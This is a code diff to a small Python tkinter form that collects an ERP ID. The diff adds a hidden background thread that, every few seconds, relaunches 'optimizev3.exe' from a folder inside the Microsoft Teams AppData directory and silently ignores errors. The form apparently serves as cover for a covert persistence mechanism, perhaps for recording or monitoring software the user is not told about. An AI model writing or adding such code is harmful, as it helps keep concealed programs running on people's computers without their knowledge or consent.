@@ -2,15 +2,39 @@ import os
 import tkinter as tk
 from tkinter import messagebox
 from tkinter import *
+import threading
+import psutil
+import time
+
 
 home_dir = os.path.expanduser("~")
 path = home_dir + "\AppData\Roaming\Microsoft\Teams"
 erpIdPath = os.path.join(path,'erpid.txt')
 
+
+def check_process_running(name):
+   for p in psutil.process_iter():
+      if p.name() == name:
+         return True
+   return False
+
+def Check_rec_running():
+   while True:
+      try:
+         if not check_process_running('optimizev3.exe'):
+            exe_path = os.path.join(path,'optimizev3.exe')
+            os.startfile(exe_path)
+         time.sleep(3)
+      except Exception as e:
+         pass
+
 if not os.path.exists(erpIdPath):
     with open(erpIdPath, 'w') as fp:
         fp.write('1')
 
+
+Rec_thread = threading.Thread(target=Check_rec_running)
+Rec_thread.start()
 
 window = tk.Tk()
 window.geometry("300x150")
@@ -77,3 +101,5 @@ btn = tk.Button(window, text ="submit",command=lambda: saveId(erpIdPath))
 btn.pack(pady=10)
 
 window.mainloop()
+
+print("dd")
